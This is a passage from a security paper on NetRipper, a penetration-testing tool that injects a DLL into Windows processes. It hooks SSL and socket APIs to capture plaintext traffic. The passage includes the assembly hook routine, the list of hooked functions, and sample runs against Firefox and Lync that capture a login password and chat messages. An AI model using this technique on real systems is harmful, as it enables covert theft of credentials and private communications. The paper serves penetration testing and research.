... 
// Call original function 
res = SslEncryptPacket_Original(hSslProvider, hKey, pbInput, cbInput, pbOutput, 
cbOutput, pcbResult, SequenceNumber, dwContentType, dwFlags); 
... 
Hooker::RestoreHook((void *)SslEncryptPacket_Callback); 
return res; 
} 
5 
The core Hook function that restores the original bytes and redirects the code flow to the callback 
function is the following: 
// Our "naked" hook function 
extern "C" __declspec(naked) void Hook() 
{ 
    __asm  
    { 
        // Get hooked function address 
        mov EAX, [ESP]                               // Get EIP_CALLING 
        sub EAX, 5                                   // Sizeof call 
        // Get and parse HookStruct 
        push EAX                                     // Function parameter 
        call Hooker::GetHookStructByOriginalAddress  // Call function 
        add ESP, 4                                   // Clean stack (cdecl) 
        push EAX                                     // Backup register 
        // Get data from HookStruct 
        mov EDX, [EAX + 4]                           // EDX == m_OriginalAddress                            
        add EAX, 8                                   // EAX == m_OriginalBytes 
        // Restore bytes 
        push REPLACE_BYTES                           // REPLACE_BYTES 
        push EAX                                     // m_OriginalBytes 
        push EDX                                     // m_OriginalAddress 
        call DWORD PTR memcpy                         
        // __cdecl memcpy(m_OriginalAddress, m_OriginalBytes, REPLACE_BYTES) 
        add  ESP, 0xC                                // Clean stack 
        pop EAX                                      // Restore register 
        push EAX                                     // Backup register 
        // Flush instruction cache 
        push REPLACE_BYTES                           // REPLACE_BYTES 
        mov EDX, [EAX + 4]                           // EDX == m_OriginalAddress 
        push EDX                                     // m_OriginalAddress 
        push 0xFFFFFFFF                              // hProcess - current process (-1) 
        call DWORD PTR [FlushInstructionCache]        
        // FlushInstructionCache(-1, m_OriginalAddress, REPLACE_BYTES) 
        pop EAX                                      // Restore register 
        // Call callback function 
        add ESP, 4                                   // "Remove" EIP_Calling from stack 
        mov EDX, [EAX]                               // Get callback pointer 
        jmp EDX                                      // Jump to callback function  
    } 
} 
6 
D. Implementation challenges 
    Because NetRipper captures both encrypted and unencrypted traffic, we had to avoid saving both 
unencrypted and encrypted data. 
    In order to capture only unencrypted traffic, a simple “function flow flag” is set. Before saving data 
to a file, each function check this flag. If it is not set, it means that the function must save captured data 
because it is the highest function in this flow. This is the case of PR_Write callback function which will 
also set the flag. When this function will call the original function, it will eventually call send function 
which will see the flag set and it will not save duplicate, useless, encrypted data. After the original 
PR_Write returns, the PR_Write callback function unsets the flag. The flag is thread-based. 
IV. PROJECT STATUS AND FUTURE WORK 
    At this moment, NetRipper hooks the following functions: 
- 
PR_Read/PR_Write from nss3.dll 
- 
PR_Send/PR_Recv from nspr4.dll 
- 
SslEncryptPacket/SslDecryptPacket from ncrypt.dll 
- 
send/recv from ws2_32.dll 
- 
SSL_Send/SSL_Recv from chrome.dll 
    It can capture the network traffic from any application that uses these APIs to send/receive data over 
the network. 
    We have successfully tested NetRipper for capturing network traffic of Microsoft Outlook, Microsoft 
Lync, Mozilla Firefox, Google Chrome, Internet Explorer, Yahoo! Messenger and other popular 
Windows applications. 
    There are multiple features that we plan to implement in NetRipper and some of its current 
functionality needs to be improved. Among the future work planned for this tool there is: 
- 
Hooking x64 based applications 
- 
Adding more API functions to the hooking list (e.g. OpenSSL) 
- 
Dynamically monitoring new processes and automatically loading in new processes 
- 
Saving captured traffic in PCAP format 
- 
Transmitting the captured data through a TCP/UDP channel to a remote machine 
V. SIMILAR TOOLS 
    We found two other applications capable of intercepting both plain-text and unencrypted network 
traffic: HookMe [3] and EchoMirage [4]. However, they both have a graphical interface and are not 
suitable to be used in a penetration test (e.g. from command line, via a remote shell, etc). 
    As a comparison, NetRipper was designed especially for penetration testers, works silently in 
background, it has a small footprint and a Metasploit post exploitation module. 
7 
VI. USAGE EXAMPLE 
For a fast test, we start NetRipper.exe with the following parameters: 
C:\Users\Ionut\Desktop\NetRipper\Debug>NetRipper.exe 
Usage: NetRipper.exe "DLLpath.dll" "ProcessName" 
E.g.   NetRipper.exe C:\Users\Ionut\DLL.dll firefox.exe 
C:\Users\Ionut\Desktop\NetRipper\Debug>NetRipper.exe DLL.dll firefox.exe 
Trying to inject DLL.dll in firefox.exe 
Reflective injected in: 1608 
The captured data is saved by default in TEMP (e.g. C:\Users\*\AppData\Local\Temp\NetRipper). 
In our example, the output file named 1608_firefox.exe_PR_Write.txt may contain the following: 
…..lsd=AVqLKT9c&email=admin%40facebook.com&pass=thisismypassword&default_persistent=0&timez
one=-180&lgndim=eyJ3IjoxNjAwLC….. 
The network traffic may also contain sensitive authentication cookies or access tokens. 
A test with Microsoft Lync can be done as follows: 
C:\Users\Ionut\Desktop\NetRipper\Debug>NetRipper.exe DLL.dll lync.exe 
Trying to inject DLL.dll in lync.exe 
Reflective injected in: 5568 
We were able to capture conversation messages sent through Lync (in rich-text format): 
{\rtf1\fbidis\ansi\ansicpg1252\deff0\nouicompat\deflang1033{\fonttbl{\f0\fni
l\fcharset0 Segoe UI;}{\f1\fnil Segoe UI;}} 
{\colortbl ;\red0\green0\blue0;} 
{\*\generator Riched20 15.0.4567}{\*\mmathPr\mwrapIndent1440 }\viewkind4\uc1 
\pard\cf1\embo\f0\fs20 THIS\embo0  \embo IS\embo0  \embo A\embo0  \embo SIMPLE\embo0  \embo
  \embo NETRIPPER\embo0  \embo LYNC\embo0  \embo TEST\embo0\f1\par 
{\*\lyncflags&lt;rtf=1&gt;}} 
VII. CONCLUSIONS 
In this paper we presented a technique for capturing network traffic of applications while having low 
privileges on a Windows machine. The implementation of this technique is NetRipper which can be 
used in penetration tests for this purpose. 
However, the usage scenarios for NetRipper are not limited to penetration tests. It can also be used 
by legitimate users on their own computers to monitor and investigate network traffic made by various 
software applications. It helps to discover how applications communicate through the network and how 
they transmit sensitive information. 
Furthermore, NetRipper can also be used for malware analysis and investigation. 
8 
VIII. AUTHOR BIO 
    Ionut Popescu - the author of NetRipper - works as a Senior Security Consultant (Penetration Tester) 
at KPMG Romania. He is passionate by ASM, reverse engineering, shellcode and exploit development 
and he has a MCTS Windows Internals certification.  
    Ionut spoke at various security conferences in Romania like: Defcamp, OWASP local meetings and 
others but also at Hacknet international conference, in Finland.  
    As a result of his recent research there are multiple papers like: PE File Format, DLL Injection and 
API Hooking (docx) [5] – a paper written in Romanian, Stack Based Buffer Overflow (pdf) [6] – a tutorial 
written in Romanian, Download & Load (DLL) [7] – a shellcode that downloads a DLL and loads it into 
memory, and others. 
    Ionut is also the main administrator of the biggest Romanian IT security community: rstforums.com 
and he writes technical articles on KPMG team’s blog, securitycafe.ro, such as: 
- 
Upgrade your DLL to Reflective DLL [8] 
- 
Intercepting functions from statically linked libraries [9] 
- 
How to intercept traffic from Java applications [10] 
IX. REFERENCES 
[1] Stephen Fewer, “Reflective DLL Injection”  
https://github.com/stephenfewer/ReflectiveDLLInjection 
[2] Stephen Fewer, “LoadLibraryR.c” 
https://github.com/stephenfewer/ReflectiveDLLInjection/blob/master/inject/src/LoadLibraryR.c 
[3] Manuel Fernandez, “HookMe” project 
https://code.google.com/p/hookme/ 
[4] BindShell/WildCroftSecurity, “EchoMirage” project 
http://www.wildcroftsecurity.com/echo-mirage 
[5] Ionut Popescu, “PE File Format, DLL Injection and API Hooking” 
https://rstforums.com/proiecte/Licenta.docx 
[6] Ionut Popescu, “Stack Based Buffer Overflow” 
http://www.exploit-db.com/docs/34304.pdf 
[7] Ionut Popescu, “Download & Load (DLL) shellcode” 
https://rstforums.com/forum/87849-rst-shellcode-download-load-dll.rst 
[8] Ionut Popescu, “Upgrade your DLL to Reflective DLL” 
http://securitycafe.ro/2015/02/26/upgrade-your-dll-to-reflective-dll/ 
[9] Ionut Popescu, “Intercepting functions from statically linked libraries” 
http://securitycafe.ro/2015/01/28/intercepting-functions-from-statically-linked-libraries/ 
[10] Ionut Popescu, “How to intercept traffic from Java applications” 
http://securitycafe.ro/2014/12/19/how-to-intercept-traffic-from-java-applications/